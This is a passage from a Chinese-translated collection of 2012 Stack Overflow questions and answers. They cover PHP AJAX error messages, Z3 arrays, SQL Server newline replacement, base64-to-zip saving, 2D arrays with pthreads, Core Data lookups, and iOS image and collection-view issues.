    public $args; 

    public function __construct($object, $method, $args = array() )  { 
        $this->object = $object;
        $this->method = $method;
        $this->args = $args;
    }

    public function execute() {

        $object = $this->object;
        $method = $this->method;
        $args   = is_array($this->args) ? $this->args : array($this->args);
        $classname = get_class($object);

        $reflectionMethod = new ReflectionMethod($classname, $method);
        return $reflectionMethod->invokeArgs($object, $args);   
    }
} 
```

希望它可以提供帮助。并感谢您提供第二个主题的链接。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T09:35:08.697

使用`func_num_args`它会给出函数参数的数量。只需使用它并使用这个例子中的参数。

```
<?php
function foo()
{
   $numargs = func_num_args();
   echo "Number of arguments: $numargs\n";
}

foo(1, 2, 3);   
?> 
```

# vb.net - 在 VB.Net 中以编程方式关闭字段

> ID：13490099
> 
> 赞同：0
> 
> 时间：2012-11-21T09:30:14.353
> 
> 标签：vb.net, arcobjects, arcmap

我正在通过 VB.net 在 Arcmap 中创建一个插件按钮，单击该按钮时会运行识别工具。但我只希望选定的字段出现在识别对话框中。我想隐藏不必要的字段，然后在使用按钮后再次显示它们。

有谁知道如何以编程方式关闭/打开字段？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-12-03T15:44:57.230

您必须迭代 layer 中的字段，然后将 visible 属性设置为 false 。看到这个链接

[gis.stackExchange](https://gis.stackexchange.com/questions/41752/turn-off-field-programmatically-in-arcmap-via-vb-net)

# php - 从旧方式 AJAX 返回消息

> ID：13490107
> 
> 赞同：0
> 
> 时间：2012-11-21T09:30:46.153
> 
> 标签：php, ajax

我有两页，一页是 HTML，它使用旧方式 AJAX 向第二页请求数据。

在这里，我向数据库中添加一条新记录并像这样返回它：

```
var HttPRequest = false;

function doCallAjax(Mode, Page, ID) {
    HttPRequest = false;
    if (window.XMLHttpRequest) { // Mozilla, Safari,...
        HttPRequest = new XMLHttpRequest();
        if (HttPRequest.overrideMimeType) {
            HttPRequest.overrideMimeType('text/html');
        }
    } else if (window.ActiveXObject) { // IE
        try {
            HttPRequest = new ActiveXObject("Msxml2.XMLHTTP");
        } catch (e) {
            try {
                HttPRequest = new ActiveXObject("Microsoft.XMLHTTP");
            } catch (e) {}
        }
    }

    if (!HttPRequest) {
        alert('Cannot create XMLHTTP instance');
        return false;
    }

    var url = 'AjaxItemsGroupsRecord.php';
    var pmeters = "titems_groups_GroupName=" + encodeURI(document.getElementById("items_groups_GroupName").value) +
        "&titems_groups_sys_type_ID=" + encodeURI(document.getElementById("items_groups_sys_type_ID").value) +
        '&myPage=' + Page +
        "&tID=" + ID +
        "&tMode=" + Mode;

    HttPRequest.open('POST', url, true);

    HttPRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    HttPRequest.setRequestHeader("Content-length", pmeters.length);
    HttPRequest.setRequestHeader("Connection", "close");
    HttPRequest.send(pmeters);

    HttPRequest.onreadystatechange = function () {

        if (HttPRequest.readyState == 3) // Loading Request
        {
            document.getElementById("mySpan").innerHTML = "Loading";
        }

        if (HttPRequest.readyState == 4) // Return Request
        {
            document.getElementById("mySpan").innerHTML = HttPRequest.responseText;
        }

    }

} 
```

如果我插入错误，我需要在其他div上返回按摩错误，我只需要显示错误信息，怎么做

我试过了，但还不行

这是我的 PHP 代码：

```
if($strMode == "ADD")
{
$sql_setting="SELECT * FROM stores_items";
$sr=mysql_query($sql_setting);
$S=@mysql_fetch_array($sr);
$stores_items_Name=$S["stores_items_Name"];     
if($_POST["tstores_items_Name"]==$stores_items_Name){
echo $msg="<div class='gadget err_or'><div class='error_tit'>
<a rel='hide_err' class='hideerr' href='#'><img width='19' height='33' alt='picture' src='../images/spacer.gif'></a>
<a rel='close_err' class='closeerr' href='#'><img width='19' height='33' alt='picture' src='../images/spacer.gif'></a>
<h3>Message</h3>
</div>
<div class='error_msg'><p>its founded</p></div>
</div>";            
}   
elseif($_POST["tstores_items_Name"]=="" or $_POST["tstores_items_SalePrice_By_Store"]=="" or $_POST["tstores_items_BuyPrice_By_Store"]==""){
echo $msg="<div class='gadget err_or'><div class='error_tit'>
<a rel='hide_err' class='hideerr' href='#'><img width='19' height='33' alt='picture' src='../images/spacer.gif'></a>
<a rel='close_err' class='closeerr' href='#'><img width='19' height='33' alt='picture' src='../images/spacer.gif'></a>
<h3>Message</h3>
</div>
<div class='error_msg'><p>(*) Fill </p></div></div>";           
}
else
{   
    $stores_items_AddDate=date('Y/m/d');
    $strSQL = "INSERT INTO stores_items ";
    $strSQL .="(stores_items_ID,stores_items_Name,stores_items_GroupId,stores_items_Barcode,stores_items_SalePrice_By_Store,stores_items_BuyPrice_By_Store,stores_items_Unit,stores_items_Currency,stores_items_Type,stores_items_AddType,stores_items_AddUser,stores_items_AddDate,stores_items_Delete,stores_items_StoreId,stores_items_sys_type_ID) ";
    $strSQL .="VALUES ";
    $strSQL .="('' , '".clean($_POST["tstores_items_Name"])."' , '".clean($_POST["tstores_items_GroupId"])."' , '".clean($_POST["tstores_items_Barcode"])."' , '".clean($_POST["tstores_items_SalePrice_By_Store"])."' ,'".clean($_POST["tstores_items_BuyPrice_By_Store"])."','".clean($_POST["tstores_items_Unit"])."','".clean($_POST["tstores_items_Currency"])."','".clean($_POST["tstores_items_Type"])."','1','$ausers_ID','$stores_items_AddDate' , '0','$ausers_StoreId','".clean($_POST["tstores_items_sys_type_ID"])."') ";
    $objQuery = mysql_query($strSQL);
echo $msg="<div class='gadget err_bl'><div class='error_tit'>
<a rel='hide_err' class='hideerr' href='#'><img width='19' height='33' alt='picture' src='../images/spacer.gif'></a>
<a rel='close_err' class='closeerr' href='#'><img width='19' height='33' alt='picture' src='../images/spacer.gif'></a>
<h3>Message</h3>
</div>
<div class='error_msg'><p>Done</p></div></div>";
}
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T09:54:18.247

返回复杂结果的最好方法是在 PHP 端输出一个 JSON 编码的数组：

```
$output = array('result' => false, 'message' => '');

// do your insert, then set $output['result'] = true if successful
// also set the message as required in $output['message'] = 'Success!'

echo json_encode($output); 
```

使用它，您可以返回一个布尔值来说明它是否成功，以及一条消息。

在 Javascript 端，您可以解码 JSON 并检查结果：

```
if(HttPRequest.readyState == 4) // Return Request
{
    var obj = JSON.parse(HttPRequest.responseText);

    if(obj.result)
    {
        // success, do something or use obj.message
        console.log( "success: " + obj.message );
    }
    else
    {
        // fail -do something
        console.log( "fail: " + obj.message );
    }
} 
```

# z3 - Z3 数组：为什么 Select() 不返回 Store() 保存的值？

> ID：13490109
> 
> 赞同：1
> 
> 时间：2012-11-21T09:30:49.300
> 
> 标签：z3, smt

我有简单的 Z3 python 代码，如下所示。我希望“打印”行将返回存储在其上方行中的“y”。相反，我得到了“A[x]”作为结果。

```
I = IntSort()
A = Array('A', I, I)
x = Int('x')
y = Int('y')
Store(A, x, y)
print Select(A,x) 
```

为什么不`Select()`返回存储的值`Store()`？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T16:51:13.880

有两点需要注意：

第一：当你写

```
Store(A, x, y) 
```

您创建一个包含三个参数 A、x 和 y的*术语。*A 没有副作用。您可以通过以下方式为该术语创建名称

```
B = Store(A,x,y) 
```

第二：除非您愿意，否则 Z3 不会简化术语。python API 公开了一个名为simplified 的简化函数。您可以通过调用简化器来获得缩减项。例子是：

```
I = IntSort()
A = Array('A', I, I)
x = Int('x')
y = Int('y')
B = Store(A, x, y)
print Select(B,x)
print simplify (Select(B,x)) 
```

# sql-server-2005 - 用空格替换回车

> ID：13490110
> 
> 赞同：8
> 
> 时间：2012-11-21T09:30:50.360
> 
> 标签：sql-server-2005, vb.net-2010

如何用空格替换数据库中某个字段中的“Enter”

实际上我已经在 vb.net 中尝试过以下代码，但没有一个对我有用，，

```
 address = Replace(address, System.Environment.NewLine, " ") 
```

或者

```
address = Replace(address, vbNewLine, " ") 
```

或者

```
address = Replace(address, Chr(13), "") 
```

语言：VB.net 数据库：MSSQL 2005

提前致谢

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-11-21T09:44:48.493

如果要替换 SQL-Server 中的换行符。

*   换行 - CHAR(10)
*   回车 - CHAR(13)

因此，如果要更新列并用空格替换 NewLines：

```
UPDATE TableName SET address=REPLACE(REPLACE(address, CHAR(13),' '), CHAR(10),' '); 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2014-09-03T10:32:47.850

*   换行 - CHAR(10)
*   回车 - CHAR(13)
*   制表符 (9)

    **替换（替换（替换（地址，CHAR（13），''），CHAR（10），''），CHAR（9），''）**

# php - 如何使用 PHP 将 base64 编码的二进制数据保存为 zip

> ID：13490112
> 
> 赞同：6
> 
> 时间：2012-11-21T09:31:03.433
> 
> 标签：php, zip, unzip

我从 API 请求响应中获取 base64 二进制编码数据。我需要将其保存为 zip 文件。我使用如下代码。

```
<?php
$zipStr = 'UEsDBBQACAAIABprdEEAAAAAAAAAAAAAAAAWAAAAb2JqZWN0cy9Db250YWN0Lm9iamVjdI2SX0vDMBTF3/cpSt9NOhERyTJCl+Gga6VNBZ9GlmWuI21mk0799ka7P50TXR4C9+R3L5ecg4bvpfK2sjaFrgZ+HwS+JyuhF0X1MvBzNr6684e4h8LGWF0m87UU1nMtlRn4K2s39xAazTfALHUtJBC6hNdBcAuDG1hKyxfcch/3PHeQKox9KuSbaetvbdkoFfNSYqEry4WdpXxdzBE86EdUaNWUlcHjPIpmMZlSBPfSOUTCMMljBv7jwiRmJGSATVh0Efj4kMS0fwlJp2QS/Q2mFOQZTTNAognJfmOXhbKyzoTeSEydSx925Yxx/9PRf9Kd/p0q1eKwVphSwuhoNnL315yvt1Pezay5dXHAShqT1PS14QrBo3yKb7lqJGbJiDwj2BbHjeDZSkjxuVR7v72d363Y5gR2goJgN3i49wlQSwcI3kTEMT8BAACvAgAAUEsDBBQACAAIABprdEEAAAAAAAAAAAAAAAALAAAAcGFja2FnZS54bWxNj00LwjAMhu/7FaN3lzpkiHTdQfDkQUS9StbFWbXtWIsf/96xDzSX5CF53ySieJtH/KTWa2dzNk84i8kqV2lb5+x42MyWrJCR2KG6Y01xN219zq4hNCsA77BJ/MW1ihLlDKScZ8AXYChghQGZjOIuRPg05Ie6Z0Om7FbKtbMBVei0fT7v8aZLAVP7J7BoSG61DydNLwE9Dtbw5y3GP2SaJVzARJGA8XwZfQFQSwcIaf0pNKsAAADwAAAAUEsBAhQAFAAIAAgAGmt0Qd5ExDE/AQAArwIAABYAAAAAAAAAAAAAAAAAAAAAAG9iamVjdHMvQ29udGFjdC5vYmplY3RQSwECFAAUAAgACAAaa3RBaf0pNKsAAADwAAAACwAAAAAAAAAAAAAAAACDAQAAcGFja2FnZS54bWxQSwUGAAAAAAIAAgB9AAAAZwIAAAAA';

header('Content-Type: application/zip');
header('Content-disposition: filename="my.zip"');
$out = base64_decode($zipFileValue);
print($out);

?> 
```

但我得到了一个 SFX zip 存档作为可下载选项。我无法使用 PHP 解压缩。我可以解压缩其他普通的 zip 文件，但不能解压缩这个 SFX zip。任何人都可以帮助我将编码数据保存为 zip 或告诉我如何解压缩 SFX zip 存档。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-21T11:23:09.187

您需要为 zip 存档创建一个临时文件，然后使用 ZipArchive() 将您的字符串作为文件添加到存档中。试试下面的例子。

```
<?php
$zipStr = 'UEsDBBQACAAIABprdEEAAAAAAAAAAAAAAAAWAAAAb2JqZWN0cy9Db250YWN0Lm9iamVjdI2SX0vDMBTF3/cpSt9NOhERyTJCl+Gga6VNBZ9GlmWuI21mk0799ka7P50TXR4C9+R3L5ecg4bvpfK2sjaFrgZ+HwS+JyuhF0X1MvBzNr6684e4h8LGWF0m87UU1nMtlRn4K2s39xAazTfALHUtJBC6hNdBcAuDG1hKyxfcch/3PHeQKox9KuSbaetvbdkoFfNSYqEry4WdpXxdzBE86EdUaNWUlcHjPIpmMZlSBPfSOUTCMMljBv7jwiRmJGSATVh0Efj4kMS0fwlJp2QS/Q2mFOQZTTNAognJfmOXhbKyzoTeSEydSx925Yxx/9PRf9Kd/p0q1eKwVphSwuhoNnL315yvt1Pezay5dXHAShqT1PS14QrBo3yKb7lqJGbJiDwj2BbHjeDZSkjxuVR7v72d363Y5gR2goJgN3i49wlQSwcI3kTEMT8BAACvAgAAUEsDBBQACAAIABprdEEAAAAAAAAAAAAAAAALAAAAcGFja2FnZS54bWxNj00LwjAMhu/7FaN3lzpkiHTdQfDkQUS9StbFWbXtWIsf/96xDzSX5CF53ySieJtH/KTWa2dzNk84i8kqV2lb5+x42MyWrJCR2KG6Y01xN219zq4hNCsA77BJ/MW1ihLlDKScZ8AXYChghQGZjOIuRPg05Ie6Z0Om7FbKtbMBVei0fT7v8aZLAVP7J7BoSG61DydNLwE9Dtbw5y3GP2SaJVzARJGA8XwZfQFQSwcIaf0pNKsAAADwAAAAUEsBAhQAFAAIAAgAGmt0Qd5ExDE/AQAArwIAABYAAAAAAAAAAAAAAAAAAAAAAG9iamVjdHMvQ29udGFjdC5vYmplY3RQSwECFAAUAAgACAAaa3RBaf0pNKsAAADwAAAACwAAAAAAAAAAAAAAAACDAQAAcGFja2FnZS54bWxQSwUGAAAAAAIAAgB9AAAAZwIAAAAA';

// Prepare Tmp File for Zip archive
$file = tempnam("tmp", "zip");
$zip = new ZipArchive();
$zip->open($file, ZipArchive::OVERWRITE);

// Add contents
$zip->addFromString('your_file_name', base64_decode($zipStr));

// Close and send to users
$zip->close();
header('Content-Type: application/zip');
header('Content-Length: ' . filesize($file));
header('Content-Disposition: attachment; filename="file.zip"');
readfile($file);
unlink($file); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2019-10-04T00:05:39.717

我尝试了下面的方法，它很有效，又好又容易。

```
$folderPath = "/this is your folder path to save the zip file/";
$zipStr = "UEsDBBQACAAIABprd_etc";
$zip_Array = explode(";base64,", $zipStr);
$zip_contents = base64_decode($zip_Array[1]);
$file = $folderPath . uniqid() . '.zip';
file_put_contents($file, $zip_contents); 
```

# c - 二维数组指针

> ID：13490113
> 
> 赞同：4
> 
> 时间：2012-11-21T09:31:07.380
> 
> 标签：c, arrays, multithreading, pointers

我正在按照一个示例在 C 中实现线程：[http](http://ramcdougal.com/threads.html) ://ramcdougal.com/threads.html 。此示例使用一维数组。我需要一个动态二维数组。

`main()`如果 in it is 而`int **array`不是会是什么样子`int array[ARRAYSIZE]`？

我的问题是如何将指向二维数组的指针传递给结构。这个想法是，我有一个大数组，每个线程应该只填充该数组的某个区域。

非常感谢 ！

这是示例中的代码：

```
struct ThreadData {

    int start, stop;
    int* array;

};

void* squarer(struct ThreadData* td) {

    struct ThreadData* data=(struct ThreadData*) td;
    int start=data->start;
    int stop=data->stop;
    int* array=data->array;
    int i;

    for (i=start; i<stop; i++) {
        array[i]=i*i;
    }

    return NULL;
}

int main(void) {

    int array[ARRAYSIZE];
    pthread_t thread[NUMTHREADS];
    struct ThreadData data[NUMTHREADS];
    int i;

    int tasksPerThread=(ARRAYSIZE+NUMTHREADS-1)/NUMTHREADS;

    for (i=0; i<NUMTHREADS; i++) {
        data[i].start=i*tasksPerThread;
        data[i].stop=(i+1)*tasksPerThread;
        data[i].array=array;
    }
    /* the last thread must not go past the end of the array */
    data[NUMTHREADS-1].stop=ARRAYSIZE;

    /* Launch Threads */
    for (i=0; i<NUMTHREADS; i++) {
        pthread_create(&thread[i], NULL, squarer, &data[i]);
    }

    /* Wait for Threads to Finish */
    for (i=0; i<NUMTHREADS; i++) {
        pthread_join(thread[i], NULL);
    }

    /* Display Result */
    for (i=0; i<ARRAYSIZE; i++) {
        printf("%d ", array[i]);
    }
    printf("\n");

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-21T10:07:14.840

动态分配二维数组使用这样的东西：

```
int** array = malloc(sizeof(int*)*ARRAYSIZE); 
```

在这里你分配了一个指向 int 的指针数组，现在你应该为每个指针分配内存：

```
for(int i = 0;i<ARRAYSIZE;i++)
    array[i] = malloc(sizeof(int)*INNER_ARRAYSIZE); 
```

现在用您的实际数据填充每个条目：

```
for(int i = 0;i<ARRAYSIZE;i++)
    for(int j = 0;j<INNER_ARRAYSIZE;j++)
        array[i][j]=(i+j);//just for example 
```

并更新您的 ThreadData 结构以使用二维数组：

```
struct ThreadData {

int start, stop;
int** twoDimArray;//note one more * here 
```

};

只需在此处传递指针：

```
struct ThreadData data;
data.twoDimArray = array;
data.twoDimArray[0][0] = data.twoDimArray[0][0]*data.twoDimArray[0][0]; //access element at 0,0 and square it 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T10:15:01.383

这样想：

当使用一维数组时，`start`和`stop`是表示一维空间中坐标的一维向量（并且一维向量可以用整数表示，这是原始代码使用的。）

所以在二维数组中，`start`应该`stop`是二维向量：

```
struct ThreadData
{
  int start[2], stop[2];
  int **array;
} 
```

然后，您在线程之间拆分矩形块。并且每个线程获取其块 in 的左上角的`start`位置，以及其块 in 的右下角的位置`stop`。

![在此处输入图像描述](../Images/5d3cb1c00e1a994c06818420a007350a.png)

*请记住，矩形块可以是高条（每个线程 1 列），也可以是长条（每个线程一行），或者正方形，或者介于两者之间的任何位置。您必须通过基准测试来决定哪种形状工作得更快。*

从某种意义上说，`tasksPerThread`也有两个维度。随着实际的任务数变成`tasksPerThread[0] * tasksPerThread[1]`.

# c# - 如何访问需要身份验证的共享网络文件夹？

> ID：13490115
> 
> 赞同：1
> 
> 时间：2012-11-21T09:31:10.750
> 
> 标签：c#, asp.net, asp.net-mvc, windows-authentication, shared

我有一个网络共享文件夹，我想从我的 asp.net mvc 应用程序访问该文件夹。

它在本地工作正常，但是当我将它部署在服务器上时它失败了

文件夹受用户名和密码保护

问题是如何配置应用程序以通过身份验证

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T09:55:13.743

假设您的意思是该文件夹不是 Web 服务器的本地文件夹，我相信您需要按照此处所述设置委派：[如何为委派方案配置 ASP.NET 应用程序](http://support.microsoft.com/kb/810572)。

# ios - 将核心数据对象传递给 didSelectRowAtIndexPath 上的子视图

> ID：13490116
> 
> 赞同：0
> 
> 时间：2012-11-21T09:31:13.150
> 
> 标签：ios, uitableview, core-data, didselectrowatindexpath

我有一个包含 2 个数据库实体的核心数据设置。为了名称，我将它们称为主要和次要。次要只属于一个主要（建立关系）。在列出表中主要对象的主视图中，我检索了它们并将它们放入存储它的属性（包括托管对象 ID）的 PriObject 类中。然后将 PriObject 添加到可变数组 (priArray)，然后使用该数组填充数据。到目前为止一切正常。然后，当我单击该行时，我可以记录 PriObject.moID。

我不知道如何在数据库中查找该对象，因此我可以向其中添加辅助对象。我不能按名称来做，因为某些 Primary 可能具有相同的名称。

我需要弄清楚如何从 URI 或 ID 中取回对象。我有 ID，因此如果需要，我可以生成 URI。

根本无法理解它，我在寻找时发现的任何例子都不能满足我的需要。有哪些选择？

编辑：我目前正在使用以下内容获取所有对象。

```
AppDelegate *appDelegate = [[UIApplication sharedApplication] delegate];

NSManagedObjectContext *context = [appDelegate managedObjectContext];

NSEntityDescription *entityDesc = [NSEntityDescription entityForName:@"Primary"
                                              inManagedObjectContext:context];

NSFetchRequest *request = [[NSFetchRequest alloc] init];
[request setEntity:entityDesc];

NSError *error;
NSArray *objects = [context executeFetchRequest:request
                                          error:&error];

if ([objects count] == 0) {
    NSLog(@"Nothing found");
} else {
    NSLog(@"Something found");
} 
```

我怎样才能改变这个只是使用：

```
ObjectWithID: 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T09:48:24.100

调用实例上的`objectWithID:`方法`NSManagedObjectContext`以检索实例。

顺便说一句，这门课似乎让你自己变得更难了`PriObject`，它似乎是你的`NSManagedObject`实例的包装器，对吗？我`NSManagedObject`个人只是直接使用子类。

# javascript - 如何创建预先描述的js的iframe模态表单？

> ID：13490124
> 
> 赞同：0
> 
> 时间：2012-11-21T09:31:19.787
> 
> 标签：javascript, jquery, jsp

我有一个名为 makeIframeModal.js 的 js 文件。通常，当我尝试创建 iframe 时，会在 jsp 中使用 iframe 标签，如下所示：

```
<iframe id="myIframeId" style="display:none;" height="430" width="675" src="myjsp.jsp" ></iframe> 
```

现在 makeIframeModal.js 包含这样的 iframe 描述：

```
iframemodal = new modal($('framebtn'), {

afterOpen : function(){$$('.close a').invoke('observe','click',function(e){modal.close(); Event.stop(e);});},
opacity: 0.3,
width: 675,
fade: true,
fadeDuration: 0.1,
autoOpenIfLinked: false

}); 
```

所以，我的 iframe 在弹出窗口中打开。现在我在这个 iframe 中有一个链接，点击它会关闭 iframe。我这样做是这样的：

```
function closeMyIframe()
{
var parentDynamicDiv = window.parent.document.getElementById('dynamic_id1');
var iframe = window.parent.document.getElementById('dynamic_id2');
iframe.style.display = 'none';
parentDynamicDiv.style.display = 'none';
} 
```

但是，现在我需要打开另一个名为 myNewIframeModal 的 iframe。

简而言之：当我关闭第一个 iframe 时，另一个 iframe 必须在弹出窗口中自动打开。我怎样才能实现这个功能？请帮助我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:09:28.720

您可以在 closeMyframe 中调用新模式...

```
function closeMyIframe()
{
var parentDynamicDiv = window.parent.document.getElementById('dynamic_id1');
var iframe = window.parent.document.getElementById('dynamic_id2');
iframe.style.display = 'none';
parentDynamicDiv.style.display = 'none';

iframemodal2 = new modal($('framebtn'), {

afterOpen : function(){$$('.close a').invoke('observe','click',function(e){modal.close(); Event.stop(e);});},
opacity: 0.3,
width: 675,
fade: true,
fadeDuration: 0.1,
autoOpenIfLinked: false

});

} 
```

# objective-c - Objective c iPhone UIImage 转换为 PNG PPI/DPI 太高

> ID：13490129
> 
> 赞同：1
> 
> 时间：2012-11-21T09:31:39.443
> 
> 标签：objective-c, uiimage, png, dpi, ppi

我正在生成一个 UIImage ：

```
//scale UIView size to match underlying UIImage size
float scaleFactor = 10.0

UIGraphicsBeginImageContextWithOptions(self.bounds.size, self.opaque, scaleFactor);

[self.layer renderInContext:UIGraphicsGetCurrentContext()];

UIImage* image = UIGraphicsGetImageFromCurrentImageContext(); 
```

UIImage 的大小为 3200x2400，这正是我想要的。但是，当我转换为 PNG 格式以作为电子邮件附件发送时：

```
NSData* data = UIImagePNGRepresentation(image);

MFMailComposeViewController* controller;
...
[controller addAttachmentData:data mimeType:mimeType fileName:.fileName]; 
```

我最终得到的图像是 720 ppi，因此约为 12.8mb。这太大了。

我不知道 720 ppi 来自哪里，UIImage 是从 72 ppi 的图像生成的。它必须与以下内容有关：

```
UIGraphicsBeginImageContextWithOptions(self.bounds.size, self.opaque,scaleFactor); 
```

我需要根据底层 UIImage（比 UIView 的边界大得多）从 UIView 创建 UIImage，但我需要维护原始 ppi。720 ppi 对于电子邮件附件来说太不切实际了。

有什么想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T09:41:39.467

你`scaleFactor`的在. `too high`_ 然后截图。`results``large image data``Decrease` `scaleFactor`

基本上应该是

```
float scaleFactor = 1.0; 
```

转换成PNG，如：

```
 NSData *imageData = UIImagePNGRepresentation(imagehere); 
```

将 imageData 附加到邮件。

编辑：像这样调整图像大小：

```
 UIGraphicsBeginImageContextWithOptions(self.bounds.size, self.opaque, 1.0);
 [yourimageview.image drawInRect:CGRectMake(0,0,self.bounds.size)];
 UIImage* image = UIGraphicsGetImageFromCurrentImageContext();
 UIGraphicsEndImageContext(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T14:30:58.883

根据 eagle.dan.1349 的建议，我尝试了以下方法：

```
-(UIImage*)convertViewToImage
{
    UIImage* retVal = nil;

    //create the graphics context
    CGSize imageSize = targetImage.size;
    CGSize viewSize = self.bounds.size;

    //CGSize cvtSize = CGSizeMake(imageSize.width/viewSize.width,            imageSize.height/viewSize.height);
    float scale = imageSize.width/viewSize.width;

    UIGraphicsBeginImageContextWithOptions(self.bounds.size, self.opaque, scale);

    //write the contents of this view into the context
    [self.layer renderInContext:UIGraphicsGetCurrentContext()];

    //get the image
    retVal = UIGraphicsGetImageFromCurrentImageContext();

    //close the graphics context
    UIGraphicsEndImageContext();

    NSData* data = UIImageJPEGRepresentation(retVal, 0.0);
    [retVal release];
    retVal = [UIImage imageWithData:data];

    return retVal;
} 
```

*稍后我执行：

```
NSData* data = UIImagePNGRepresentation(image); 
```

然而，正如我所提到的，这仍然会产生 5.8 MB 的图像，所以我怀疑在 300 ppi 附近的某个地方。

我需要一个 UIImage，它是从 UIView 创建的，具有我需要的分辨率和大小（72 ppi，3200X2400）。必须有办法做到这一点。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T09:51:38.133

首先，我想知道您的设备如何不会因这些高清图像而哭泣。当我从事与图像相关的项目时，PNG 的高分辨率导致社交网络共享和电子邮件发送出现许多问题，因此我们转向了 JPEG。此外，一般不建议以 PNG 格式在 web 上发送图像，最好将其设为 JPEG 并适当压缩。但是，如果您需要使用 PNG，您可以使用这种技巧：首先将其转换为 JPEG 数据，使用此数据初始化您的图像，然后再将其转换为 PNG。

编辑：此外，尝试仅设置您需要 320X240 的上下文大小，并且缩放不是 10，而是设置为 0，以便系统确定所需的比例。它可能会有所帮助。然后再次缩放生成的 UIImage 。

# php - 使用 ajax 调用投票和取消投票选择

> ID：13490130
> 
> 赞同：0
> 
> 时间：2012-11-21T09:31:39.303
> 
> 标签：php, ajax

这是我网站的网址。

[http://domain.com/pollpage.php?id=4&mview=34](http://domain.com/pollpage.php?id=4&mview=34)

登录后，我们可以一次为一个投票选项投票。

在投票页面中，我使用 ajax 调用投票并取消投票选择。如果用户想为这些选项投票，他们只需点击投票按钮。如果他们想要取消投票，请再次单击相同的投票按钮。它工作正常，但有时它不工作。用户投票后无法取消选择。有谁能知道这是什么原因。

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:30:00.880

使用标志一个进行投票，另一个用于投票。并在数据库中创建一个字段，例如投票。使用 Ajax 它只是分别增加或减少数据库中的值。

# tomcat - 从 Web 应用程序调用线程是否安全

> ID：13490132
> 
> 赞同：0
> 
> 时间：2012-11-21T09:31:43.307
> 
> 标签：tomcat, servlets, thread-safety

我有一个 Web 应用程序（Servlet），我在其中获得一个视频（作为文件）并将它们上传到 YouTube。无论如何，我所拥有的是创建一个用于将文件上传到 YouTube 的线程。我将内容添加到队列中，线程将保留上传文件，直到队列完成。每次上传之间的延迟为 1 分钟。

它工作正常，直到 YouTube 说您的一小时上传限制已完成。

但是，如果我将两次上传之间的间隔设为 15 分钟，并且如果我通过休眠线程来保持该间隔，那么从长远来看，这将是一个问题（假设有 40 个视频的队列 = 10 小时）。是否有任何最佳实践来开发这样的场景。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T13:02:52.387

对于这种情况，单独的线程是不合适的工具。它一生的大部分时间都在睡觉。而是使用[`Timer.schedule()`](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/Timer.html#schedule%28java.util.TimerTask,%20long,%20long%29)适当设置的时间段。您的时间将由已在 JVM 中为此目的运行的专用线程处理。你现在所拥有`run()`的`Thread`，就去做吧[`TimerTask`](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/TimerTask.html)。

# objective-c - 未调用 cellForItemAtIndexPath

> ID：13490133
> 
> 赞同：1
> 
> 时间：2012-11-21T09:31:48.750
> 
> 标签：objective-c, xcode, cocoa, collectionview

我正在尝试从视图控制器推送到集合视图控制器。

```
UICollectionViewLayout *collectionViewLayout = [[UICollectionViewLayout alloc] init];
xraylab *xraylabvc = [[xraylab alloc]initWithCollectionViewLayout:collectionViewLayout];
[self.navigationController pushViewController:xraylabvc animated:YES]; 
```

集合视图控制器将显示一个空白的黑屏。

`numberOfSectionsInCollectionView`返回 1

`numberOfItemsInSection`返回一个非零整数

我的问题是`cellForItemAtIndexPath`没有调用。

集合视图的委托和数据源已设置。

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T09:55:06.690

`numberOfItemsInSection`应该执行`return` `rowcount > 0`_`cellForItemAtIndexPath`

检查`Delegate`和是`datasource`_`collection view``set`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-09-06T15:44:51.350

我遇到了同样的问题，这让我发疯了，这是有效的代码。

```
UICollectionViewFlowLayout *CollLayout = [[UICollectionViewFlowLayout alloc] init];
UICollectionView *AttachmentsView = [[UICollectionView alloc] initWithFrame:CGRectMake(20, CurrentY, 640, 300) collectionViewLayout:CollLayout];
//AttachmentsView.backgroundColor = [UIColor whiteColor];
[AttachmentsView registerClass:[Cell class] forCellWithReuseIdentifier:@"ReuseCell"];
[VaribleStore SharedInstance].Attachments = [[NSMutableArray alloc] initWithObjects:[UIColor yellowColor],[UIColor redColor],[UIColor blueColor], nil];
AttachmentsView.delegate = self;
AttachmentsView.dataSource = self;
[self.ScrollView addSubview:AttachmentsView];
[AttachmentsView reloadData]; 
```

关键是要使用 UICollectionViewFlowLayout，原因是 UICollectionViewLayout 是一个抽象类，不能用于此目的。在我正常切换 ios 调用 cellForItemAtIndexPath 之后。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-06T19:52:45.000

您不能按原样使用 UICollectionViewLayout。它是一个抽象基类，它必须是子类。如果您不想自己编写，可以将 UICollectionViewFlowLayout 用于类似网格的视图。

# android - 更改微调器背景

> ID：13490135
> 
> 赞同：1
> 
> 时间：2012-11-21T09:31:55.973
> 
> 标签：android, android-spinner

我创建了一个看起来像的微调器

![微调器](../Images/8899150963217e42fbd4d9e699ccb979.png)

我的布局文件是：

```
<RelativeLayout
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:background="@drawable/round_corners"
        android:padding="7dip" >

        <Spinner
            android:id="@+id/select_city"
            android:layout_width="wrap_content"
